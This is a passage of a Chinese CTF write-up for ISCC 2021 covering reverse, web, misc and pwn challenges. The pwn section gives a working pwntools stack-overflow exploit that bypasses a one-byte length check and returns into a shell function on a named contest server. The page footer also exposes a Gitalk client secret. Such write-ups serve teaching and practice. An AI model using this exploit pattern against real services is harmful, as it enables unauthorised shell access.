class="keyword">if</span>(arg14.length() != v1) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v0 = arg14.charAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> v4 = arg14.charAt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> v5 = arg14.charAt(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> v6 = arg14.charAt(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> v8 = arg14.charAt(v7);</span><br><span class="line">    <span class="keyword">int</span> v9 = arg14.charAt(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">int</span> v10 = arg14.charAt(<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">int</span> v12 = arg14.charAt(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>(v0 % <span class="number">8</span> == <span class="number">7</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(v0 % <span class="number">9</span> != v1) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> v11 = <span class="number">100</span>;</span><br><span class="line">            <span class="keyword">if</span>(v4 - <span class="number">3</span> != v11) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((v5 ^ <span class="number">93</span>) != v11) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(v5 * <span class="number">2</span> - <span class="number">10</span> != v6) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(v8 + <span class="number">1</span> != <span class="number">120</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((v9 ^ v10) != <span class="number">56</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(v9 - v10 == <span class="number">24</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v10 - v12 != v7) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(v12 != <span class="number">80</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说<code>arg14=&#39;&#39;.join(map(chr,[v0,v4,v5,v6,v8,v9,v10,v12]))</code></p>
<p>可以轻松分析出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v0 % <span class="number">8</span> == <span class="number">7</span></span><br><span class="line">v0 % <span class="number">9</span> == v1 <span class="comment">#v1=8</span></span><br><span class="line">v4 - <span class="number">3</span> == v11 <span class="comment">#v11=100</span></span><br><span class="line">v5 ^ <span class="number">93</span> == v11 <span class="comment">#v11=100</span></span><br><span class="line">v5 * <span class="number">2</span> - <span class="number">10</span> == v6</span><br><span class="line">v8 + <span class="number">1</span> == <span class="number">120</span></span><br><span class="line">(v9 ^ v10) == <span class="number">56</span></span><br><span class="line">v9 - v10 == <span class="number">24</span></span><br><span class="line">v10 - v12 == v7 <span class="comment">#v7=4</span></span><br><span class="line">v12 == <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>所以可以得出在可见字符范围内后半部分的值是<code>Gg9hwlTP</code>（过程统一放本题最后的exp里）。</p>
<p>最后分析<code>first.firstStr()</code>：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506200139777.png"></p>
<p>就是一堆replace而已，逆向的话把替换前替换后反过来就好。</p>
<p>所以有整道题的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 前半部分</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key=<span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">cipher=base64.b64decode(<span class="string">b&#x27;9z2ukkD3Ztxhj+t/S1x1Eg==&#x27;</span>)</span><br><span class="line">text=aes.decrypt(cipher)</span><br><span class="line">flag1=text.decode().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># print(flag1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 后半部分</span></span><br><span class="line">v1=<span class="number">8</span></span><br><span class="line">v11=<span class="number">100</span></span><br><span class="line">v7=<span class="number">4</span></span><br><span class="line">v12=<span class="number">80</span></span><br><span class="line">v10=v12+v7</span><br><span class="line">v9=<span class="number">56</span>^v10</span><br><span class="line">v8=<span class="number">120</span><span class="number">-1</span></span><br><span class="line">v4=v11+<span class="number">3</span></span><br><span class="line">v5=v11^<span class="number">93</span></span><br><span class="line">v6=v5*<span class="number">2</span><span class="number">-10</span></span><br><span class="line"><span class="keyword">for</span> v0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">if</span> v0%<span class="number">8</span>==<span class="number">7</span> <span class="keyword">and</span> v0%<span class="number">9</span>==v1:</span><br><span class="line">        l=[v0,v4,v5,v6,v8,v9,v10,v12]</span><br><span class="line">        flag2=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,l))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(flag2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### replace处理</span></span><br><span class="line">flag=<span class="string">&quot;ISCC&#123;&quot;</span>+flag1+flag2+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag=flag.replace(<span class="string">&quot;dN&quot;</span>,<span class="string">&quot;B1&quot;</span>).replace(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;P&quot;</span>,<span class="string">&quot;!&quot;</span>).replace(<span class="string">&quot;hwl&quot;</span>,<span class="string">&quot;rea&quot;</span>).replace(<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;m&quot;</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>flag：<strong>ISCC{m0B1lE_1s_Gg9reaT!}</strong></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="练武题-50pt-ISCC客服冲冲冲（一）"><a href="#练武题-50pt-ISCC客服冲冲冲（一）" class="headerlink" title="[练武题 50pt] ISCC客服冲冲冲（一）"></a>[练武题 50pt] ISCC客服冲冲冲（一）</h2><p>改前端代码这两个地方，让左右元素的id互换，等完20s就好：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506202040679.png"></p>
<p>拿到flag</p>
<p><img src="/p/wpFor-2021iscc/image-20210506202140298.png"></p>
<p>flag：<strong>ISCC{1SCC_2o2l_KeFuu}</strong></p>
<h2 id="练武题-50pt-这是啥"><a href="#练武题-50pt-这是啥" class="headerlink" title="[练武题 50pt] 这是啥"></a>[练武题 50pt] 这是啥</h2><p><code>F12</code>能看到一个<code>display:none;</code>的元素，这一看就是JSFuck（</p>
<p><img src="/p/wpFor-2021iscc/image-20210506232314333.png"></p>
<p>复制到控制台运行一下就好</p>
<p><img src="/p/wpFor-2021iscc/image-20210506232442683.png"></p>
<p>比较坑的是这里不能直接复制交flag，flag格式是大写的ISCC（……）</p>
<p>即：<strong>ISCC{what_is*_jsJS&amp;}</strong></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="练武题-50pt-Retrieve-the-passcode"><a href="#练武题-50pt-Retrieve-the-passcode" class="headerlink" title="[练武题 50pt] Retrieve the passcode"></a>[练武题 50pt] Retrieve the passcode</h2><p>解压得到一个压缩包和一个txt，压缩包解密要密码，所以从txt下手。</p>
<p>txt名字是<code>scatter</code>，这个刚好跟绘制散点图的函数同名，猜测每个分号间隔的是每个点的三维坐标，然后按<code>x:y:z</code>的顺序记录。</p>
<p>可以观察得到所有的z坐标都是1，所以可以直接不要，用python画出散点图：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;scatter.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    points=[x[:<span class="number">-2</span>].replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;,&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> f.read().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;;&#x27;</span>)]</span><br><span class="line">exec(<span class="string">&quot;points_list=[(&quot;</span>+<span class="string">&#x27;),(&#x27;</span>.join(points)+<span class="string">&quot;)]&quot;</span>)</span><br><span class="line">x=[t[<span class="number">0</span>] <span class="keyword">for</span> t <span class="keyword">in</span> points_list]</span><br><span class="line">y=[t[<span class="number">1</span>] <span class="keyword">for</span> t <span class="keyword">in</span> points_list]</span><br><span class="line">plt.scatter(x,y)</span><br><span class="line">plt.axis(<span class="string">&quot;equal&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/p/wpFor-2021iscc/image-20210506220206915.png"></p>
<p>由图像可以看到密码是<code>365728</code>，解开rar包，看到是pdf，电脑图案这里有一堆的点横，摩斯电码既视感。</p>
<p><img src="/p/wpFor-2021iscc/image-20210506222247621.png"></p>
<p>先用python解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MorseList=&#123;</span><br><span class="line">    <span class="string">&quot;.-&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;-...&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;-.-.&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;-..&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;..-.&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;--.&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="string">&quot;....&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;..&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;.---&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-.-&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;.-..&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;--&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;-.&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    <span class="string">&quot;---&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;.--．&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;--.-&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;.-.&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;...&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">    <span class="string">&quot;..-&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;...-&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;.--&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;-..-&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;-.--&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;--..&quot;</span>: <span class="string">&quot;Z&quot;</span>&#125;</span><br><span class="line">code=<span class="string">&quot;-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. - .... . ..-. .-.. .- --. .. ... -.-. .... .- .-.. .-.. . -. --. . .. ... -.-. -.-. - .-- --- --.. . .-. --- - .-- --- --- -. .&quot;</span></span><br><span class="line">l=code.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> l:</span><br><span class="line">    flag+=MorseList[x]</span><br><span class="line">print(flag.lower())</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506223141261.png"></p>
<p><code>congratulation the flag is challenge iscc two zero two one</code></p>
<p>题目描述说是小写字符串，不包括空格，所以拿到flag：**ISCC{congratulationtheflagischallengeiscctwozerotwoone}**（一开始被分词坑了&#x3D; &#x3D;没想到一整句都是flag）</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="练武题-50pt-M78"><a href="#练武题-50pt-M78" class="headerlink" title="[练武题 50pt] M78"></a>[练武题 50pt] M78</h2><p>用ida打开，可以看到逻辑很简单，主要是走<code>explore()</code>函数。</p>
<p><img src="/p/wpFor-2021iscc/image-20210506224215673.png"></p>
<p><img src="/p/wpFor-2021iscc/image-20210506224247641.png"></p>
<p>read这边有限定字符数没有栈溢出，但是最后<code>return check(buf)</code>这里<code>strcpy()</code>没有检查长度，简单栈溢出。</p>
<p><img src="/p/wpFor-2021iscc/image-20210506225351289.png"></p>
<p>现在只要绕过<code>strlen()</code>就可，而v3是一字节的char，可以通过截取高位溢出绕过（也就是说构造一个长度为0x100+7的字符串发送即可）。</p>
<p>然后翻函数表可以看到这个get shell的函数，地址是<code>0x8049202</code>：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506225439683.png"></p>
<p>所以写exp有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># ------ Python2 ------</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r=process(&quot;./M78&quot;)</span></span><br><span class="line">host=<span class="string">&quot;39.96.88.40&quot;</span></span><br><span class="line">port=<span class="number">7010</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;building&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;aaa&#x27;</span>) <span class="comment">#随便填</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">getShell_addr=<span class="number">0x8049202</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(getShell_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">256</span>+<span class="number">7</span><span class="number">-1</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#记得算上最后的换行符</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>成功打通~</p>
<p><img src="/p/wpFor-2021iscc/image-20210506231923672.png"></p>
<p>拿到flag：<strong>flag{N@x_addr_*EnaBleD%}</strong></p>
<p>aes</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">c10udlnk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://c10udlnk.top/p/wpFor-2021iscc/">https://c10udlnk.top/p/wpFor-2021iscc/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://c10udlnk.top">c10udlnk's Blog</a> (https://c10udlnk.top)！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Reverse/">Reverse</a><a class="post-meta__tags" href="/tags/wp/">wp</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/p/wpFor-2021chunqiucap-BabySteg/"><i class="fa fa-chevron-left">  </i><span>【wp】2021春秋杯-BabySteg</span></a></div><div class="next-post pull-right"><a href="/p/wpFor-2021CISCNprelude/"><span>【wp】2021CISCN初赛</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '3fff94cdba288d81026d',
  clientSecret: 'e449b106b98b508de4e3ab3658f46444d26f420f',
  repo: 'c10udlnk.github.io',
  owner: 'c10udlnk',
  admin: 'c10udlnk',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(/lijiang-tower.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 - 2024 By c10udlnk</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text"><u><a target="_blank" rel="noopener" href="https://tover.xyz">密码学是二进制人的自我修养 =v=</a></u></div><div class="busuanzi"><script src="/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script src="/js/katex.js"></script><script src="/js/search/local-search.js"></script><script src="/js/DigitalRain.js"></script><script src="/live2d-widget/autoload.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">想要搜什么呢~</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search...?"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></div><!-- hexo injector body_end start -->
    <div class="myspine-spine-widget"></div>
    <script src="/js/third-party/myspine/spine-widget.js"></script>
    <script src="/js/third-party/myspine/spine-skeleton-binary.js"></script>
    <script src="/js/third-party/myspine/myspine.js"></script>
    <link type="text/css" href="/css/_third-party/myspine.css"></link>
    <script>
        new MySpine({
            spineDir: "/spine_models/",
            models: [{"name":"sd_21miku_normal_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_band_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_idol_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_night_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_street_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_wonder_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"}],
            styles: {"widget":{"width":"200px","height":"200px"},"voiceText":{"color":"#e6e6e6"}},
            behaviors: {"start":{"animation":"w_emu_run01_f","voice":"","text":"Ohhhhh好耶"},"idle":{"maxMinutes":1,"animations":[{"name":"m_cool_idle01_f","loop":false},{"name":"m_cool_joy01_f","loop":false},{"name":"m_happy_idle01_f","loop":false},{"name":"m_happy_joy01_f","loop":false},{"name":"m_normal_idle01_f","loop":false},{"name":"m_normal_joy01_f","loop":false},{"name":"m_staff_idle01_f","loop":false},{"name":"n_general_wait_01_f","loop":false},{"name":"pose_default","loop":false},{"name":"u_vbsmen_battledore00_f","loop":false},{"name":"u_vbswomen_battledore00_f","loop":false},{"name":"w_adult_idle01_f","loop":false},{"name":"w_adult_joy01_f","loop":false},{"name":"w_cool_idle01_f","loop":false},{"name":"w_cool_joy01_f","loop":false},{"name":"w_cute_idle01_f","loop":false},{"name":"w_cute_joy01_f","loop":false},{"name":"w_happy_idle01_f","loop":false},{"name":"w_happy_joy01_f","loop":false},{"name":"w_normal_idle01_f","loop":false},{"name":"w_normal_joy01_f","loop":false},{"name":"w_pure_idle01_f","loop":false},{"name":"w_pure_joy01_f","loop":false},{"name":"w_staff_idle01_f","loop":false}],"voices":[{"voice":"","text":"不买立省百分百"}]},"interact":{"maxPlaySec":3,"animations":[{"name":"w_normal_joy01_b","loop":false},{"name":"m_cool_angry01_f","loop":false},{"name":"m_cool_doubt01_f","loop":false},{"name":"m_cool_laugh01_f","loop":false},{"name":"m_cool_listen01_f","loop":false},{"name":"m_cool_sad01_f","loop":false},{"name":"m_cool_surprise01_f","loop":false},{"name":"m_cool_talk01_f","loop":false},{"name":"m_happy_angry01_f","loop":false},{"name":"m_happy_doubt01_f","loop":false},{"name":"m_happy_laugh01_f","loop":false},{"name":"m_happy_listen01_f","loop":false},{"name":"m_happy_sad01_f","loop":false},{"name":"m_happy_surprise01_f","loop":false},{"name":"m_happy_talk01_f","loop":false},{"name":"m_normal_angry01_f","loop":false},{"name":"m_normal_doubt01_f","loop":false},{"name":"m_normal_laugh01_f","loop":false},{"name":"m_normal_listen01_f","loop":false},{"name":"m_normal_surprise01_f","loop":false},{"name":"m_normal_talk01_f","loop":false},{"name":"m_normal_walk01_b","loop":false},{"name":"m_normal_walk01_f","loop":false},{"name":"m_tsukasa_run01_f","loop":false},{"name":"n_general_walk_01_b","loop":false},{"name":"n_general_walk_01_f","loop":false},{"name":"u_liondancerobot_run_01_f","loop":false},{"name":"u_liondancerobot_run_02_f","loop":false},{"name":"u_vbsmen_battledore01_f","loop":false},{"name":"u_vbsmen_battledore02_f","loop":false},{"name":"u_vbsmen_battledore03_f","loop":false},{"name":"u_vbsmen_battledore04_f","loop":false},{"name":"u_vbswomen_battledore01_f","loop":false},{"name":"u_vbswomen_battledore02_f","loop":false},{"name":"u_vbswomen_battledore03_f","loop":false},{"name":"u_vbswomen_battledore04_f","loop":false},{"name":"w_adult_angry01_f","loop":false},{"name":"w_adult_doubt01_f","loop":false},{"name":"w_adult_laugh01_f","loop":false},{"name":"w_adult_listen01_f","loop":false},{"name":"w_adult_sad01_f","loop":false},{"name":"w_adult_surprise01_f","loop":false},{"name":"w_adult_talk01_f","loop":false},{"name":"w_cool_angry01_f","loop":false},{"name":"w_cool_doubt01_f","loop":false},{"name":"w_cool_laugh01_f","loop":false},{"name":"w_cool_listen01_f","loop":false},{"name":"w_cool_sad01_f","loop":false},{"name":"w_cool_surprise01_f","loop":false},{"name":"w_cool_talk01_f","loop":false},{"name":"w_cute_angry01_f","loop":false},{"name":"w_cute_angry02_f","loop":false},{"name":"w_cute_doubt01_f","loop":false},{"name":"w_cute_laugh01_f","loop":false},{"name":"w_cute_listen01_f","loop":false},{"name":"w_cute_sad01_f","loop":false},{"name":"w_cute_surprise01_f","loop":false},{"name":"w_cute_talk01_f","loop":false},{"name":"w_emu_run02_f","loop":false},{"name":"w_happy_angry01_f","loop":false},{"name":"w_happy_angry02_f","loop":false},{"name":"w_happy_doubt01_f","loop":false},{"name":"w_happy_doubt02_f","loop":false},{"name":"w_happy_laugh01_f","loop":false},{"name":"w_happy_listen01_f","loop":false},{"name":"w_happy_sad01_f","loop":false},{"name":"w_happy_surprise01_f","loop":false},{"name":"w_happy_talk01_f","loop":false},{"name":"w_normal_laugh01_f","loop":false},{"name":"w_normal_listen01_f","loop":false},{"name":"w_normal_talk01_f","loop":false},{"name":"w_normal_walk01_b","loop":false},{"name":"w_normal_walk01_f","loop":false},{"name":"w_pure_angry01_f","loop":false},{"name":"w_pure_doubt01_f","loop":false},{"name":"w_pure_laugh01_f","loop":false},{"name":"w_pure_listen01_f","loop":false},{"name":"w_pure_sad01_f","loop":false},{"name":"w_pure_surprise01_f","loop":false},{"name":"w_pure_talk01_f","loop":false},{"name":"z_mesh_templete","loop":false},{"name":"z_test_F_negi01","loop":false}],"voices":[{"voice":"","text":"既见未来，为何不buy"}]}}
        });
    </script>
    <!-- hexo injector body_end end --></body></html>